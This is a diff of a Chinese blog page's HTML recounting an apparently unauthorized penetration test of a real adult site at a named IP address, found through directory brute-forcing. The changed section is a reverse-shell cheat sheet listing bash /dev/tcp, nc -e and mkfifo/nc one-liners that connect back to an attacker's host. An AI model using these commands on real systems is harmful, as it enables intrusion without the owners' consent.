@@ -96,7 +96,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/8.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/9.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/10.png">
-<meta property="og:updated_time" content="2019-11-06T08:30:28.128Z">
+<meta property="og:updated_time" content="2019-11-06T13:08:42.622Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="纪录对黄站的一次渗透测试">
 <meta name="twitter:description" content="该站点是本人同事分享给我的，本着技术学习的目的就对这个站点进行了一下简单的测试。 渗透流程确定目标站点http://156.236.127.158/ 对站点进行目录爆破这里我使用的是御剑和dirsearch-master、该过程中没有发现什么特别的东西，就发现了一个phpinfo页面和一个后台地址。  简单的过了一下没有发现什么可用的数据。那只有硬着头皮去看主体内容有没有可挖掘的东西。 开始渗透注">
@@ -434,11 +434,12 @@
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="常见shell反弹总结"><a href="#常见shell反弹总结" class="headerlink" title="常见shell反弹总结"></a>常见shell反弹总结</h3><p>可以根据服务器上面存在的进行利用。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis bash nc php python ecex</span><br></pre></td></tr></table></figure>
 
-<p>可以采用上述方式进行查看。</p>
+<p>具体可以采用上述方式进行查看。</p>
+<p>用bash反弹</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/公网主机IP/端口 0&gt;&amp;1</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/公网主机IP/端口 0&gt;&amp;1</span><br><span class="line">/bin/sh -i &gt;&amp; /dev/tcp/公网主机IP/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
 <p>这里简单解释一下:<br>bash -i 打开一个交互的bash,&gt;&amp; 将标准错误输出重定向到标准输出<br>/dev/tcp/x.x.x.x/port 意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口 0&gt;&amp;1 标准输入重定向到标准输出，实现你与反弹出来的shell的交互。</p>
-<p>用bash反弹</p>
+<p>用nc反弹</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 公网主机IP 端口</span><br><span class="line">rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 公网主机IP 端口 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
 
 <p>用python反弹</p>
